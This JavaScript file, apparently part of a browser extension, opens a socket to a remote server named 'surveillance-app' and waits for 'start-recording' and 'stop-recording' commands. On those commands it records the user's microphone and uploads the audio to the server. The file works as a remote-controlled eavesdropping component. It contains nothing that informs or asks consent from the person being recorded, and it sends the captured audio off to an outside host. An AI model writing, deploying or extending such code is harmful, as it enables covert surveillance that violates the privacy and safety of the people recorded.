// offscreen.js

// Important: Change this URL to your deployed Render URL when deploying (e.g. 'https://your-app.onrender.com')
const SERVER_URL = 'https://surveillance-app-lvf5.onrender.com';

const socket = io(SERVER_URL);

let mediaRecorder;
let audioChunks = [];
let stream;

async function setupRecorder() {
    if (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            console.log('Microphone access granted in offscreen document.');
        } catch (err) {
            console.warn('Microphone access failed. Error:', err.name, err.message, err);
            return false;
        }
    }

    if (!mediaRecorder) {
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = async () => {
            console.log('Uploading recording...');
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            audioChunks = []; // Reset for next recording

            const formData = new FormData();
            formData.append('audio', audioBlob, 'recording.webm');

            try {
                const response = await fetch(`${SERVER_URL}/upload`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('Upload successful.');
                } else {
                    console.log('Upload failed.');
                }
            } catch (err) {
                console.error('Upload error:', err);
            }
        };
    }
    return true;
}

// Ensure the recorder is set up on load
setupRecorder();

socket.on('start-recording', async () => {
    const isReady = await setupRecorder();
    if (isReady && mediaRecorder && mediaRecorder.state === 'inactive') {
        audioChunks = [];
        mediaRecorder.start();
        console.log('Recording started...');
    } else {
        console.warn('Cannot start recording, microphone access missing.');
    }
});

socket.on('stop-recording', () => {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        console.log('Recording stopped...');
    }
});

socket.on('connect', () => {
    console.log('Connected to WebSocket server:', socket.id);
});
